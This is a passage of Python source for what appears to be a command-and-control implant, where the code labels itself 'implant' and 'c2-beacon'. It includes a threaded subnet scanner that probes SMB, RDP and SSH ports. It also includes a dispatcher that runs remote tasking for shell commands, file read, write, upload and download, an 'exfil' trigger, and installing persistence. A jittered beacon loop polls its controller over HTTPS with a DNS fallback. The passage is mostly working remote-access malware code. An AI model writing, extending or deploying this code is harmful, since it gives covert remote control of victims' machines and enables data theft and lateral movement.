                    r = subprocess.run(
                        ["ping", "-n", "1", "-w", str(timeout_s * 1000), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                else:
                    r = subprocess.run(
                        ["ping", "-c", "1", "-W", str(timeout_s), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                return r.returncode == 0
            except Exception:
                return False

        def _tcp_probe(ip, port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout_s)
                s.connect((ip, port))
                s.close()
                return True
            except Exception:
                return False

        alive = []
        threads = []
        lock = threading.Lock()

        def scan_host(ip):
            if _ping_host(ip) or _tcp_probe(ip, 445) or _tcp_probe(ip, 22):
                hostname = ""
                try:
                    hostname = socket.getfqdn(ip)
                    if hostname == ip:
                        hostname = ""
                except Exception:
                    pass
                ports = []
                for p in [22, 80, 135, 139, 443, 445, 3389, 8080, 8443]:
                    if _tcp_probe(ip, p):
                        ports.append(p)
                with lock:
                    alive.append({"ip": ip, "hostname": hostname, "ports": ports})

        for i in range(1, 255):
            ip = f"{base}.{i}"
            t = threading.Thread(target=scan_host, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=timeout_s + 3)
                threads = []

        for t in threads:
            t.join(timeout=timeout_s + 3)

        alive.sort(key=lambda h: tuple(int(o) for o in h["ip"].split(".")))
        my_ips = set(self._get_local_ips())

        for h in alive:
            marker = " [SELF]" if h["ip"] in my_ips else ""
            port_str = ",".join(str(p) for p in h["ports"]) if h["ports"] else "-"
            host_str = f' ({h["hostname"]})' if h["hostname"] else ""
            results.append(f'  {h["ip"]}{host_str}  ports:[{port_str}]{marker}')

        results.append(f"\n{len(alive)} hosts alive")
        return "\n".join(results)

    # ── Task dispatcher ──

    def _process_tasking(self, tasking: dict):
        if not tasking:
            return

        cmd = tasking.get("cmd", "")
        args = tasking.get("args", "")
        task_id = tasking.get("id", "")
        data = tasking.get("data", "")

        status = "ok"
        output = ""
        result_data = None

        try:
            if cmd == "sleep":
                parts = str(args).split()
                self.interval = max(1, float(parts[0]))
                if len(parts) > 1:
                    self.jitter = max(0, min(100, float(parts[1]))) / 100.0
                output = f"Sleep {self.interval}s jitter {int(self.jitter * 100)}%"
                logger.info(output)

            elif cmd == "kill":
                logger.warning("Kill command received")
                output = "Shutting down"
                self._running = False

            elif cmd == "shell":
                timeout = tasking.get("timeout", 300)
                output = self._exec_shell(args, timeout=timeout)

            elif cmd == "ls":
                output = self._exec_ls(args or ".")

            elif cmd == "cat":
                output = self._exec_cat(args)

            elif cmd == "pwd":
                output = self._exec_pwd()

            elif cmd == "cd":
                output = self._exec_cd(args)

            elif cmd == "cp":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_cp(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: cp <src> <dst>"

            elif cmd == "mv":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_mv(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: mv <src> <dst>"

            elif cmd == "rm":
                output = self._exec_rm(args)

            elif cmd == "mkdir":
                output = self._exec_mkdir(args)

            elif cmd == "chmod":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_chmod(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: chmod <mode> <path>"

            elif cmd == "write":
                output = self._exec_write(args, data)

            elif cmd == "upload":
                output = self._exec_upload(args, data)

            elif cmd == "download":
                dl = self._exec_download(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    output = f"Downloaded {dl['filename']} ({dl['size']} bytes)"
                    result_data = dl

            elif cmd == "exfil":
                output = "Exfil scan triggered"
                logger.info("Exfil tasking received")

            elif cmd == "netscan":
                output = self._exec_netscan(args)

            elif cmd == "arptable":
                output = self._exec_arptable()

            elif cmd == "persist":
                output = self._exec_persist(args)

            elif cmd == "unpersist":
                output = self._exec_unpersist(args)

            else:
                status = "error"
                output = f"Unknown command: {cmd}"

        except Exception as e:
            status = "error"
            output = f"[exception: {e}]"

        if task_id and self.https_enabled:
            self._send_result_https(task_id, status, output, result_data)

    # ── Main loop ──

    def _beacon_loop(self):
        logger.info(
            "Beacon started — ID=%s interval=%ds jitter=%d%%",
            self._implant_id, self.interval, int(self.jitter * 100),
        )

        if self.https_enabled:
            attempts = 0
            while self._running and not self._registered and attempts < 10:
                if self._register_https():
                    self._consecutive_failures = 0
                    break
                attempts += 1
                self._consecutive_failures = attempts
                self._backoff_sleep()
            if not self._registered:
                logger.warning("Registration failed, proceeding unregistered")
                self._consecutive_failures = 0

        while self._running:
            tasking = None

            if self.https_enabled:
                tasking = self._beacon_https()

            if tasking is None and self.dns_enabled:
                tasking = self._beacon_dns()

            if tasking is None:
                self._consecutive_failures += 1
                if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                    logger.info("Re-registering after %d failures", self._consecutive_failures)
                    self._registered = False
                    self._register_https()
            elif tasking:
                self._consecutive_failures = 0
                logger.debug("Tasking: %s", tasking.get("cmd", "?"))
                self._process_tasking(tasking)
            else:
                self._consecutive_failures = 0

            if self._consecutive_failures > 3:
                self._backoff_sleep()
            else:
                self._jittered_sleep()

    def start(self):
        self._running = True
        self._thread = threading.Thread(
            target=self._beacon_loop, daemon=True, name="c2-beacon",
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Beacon stopped")
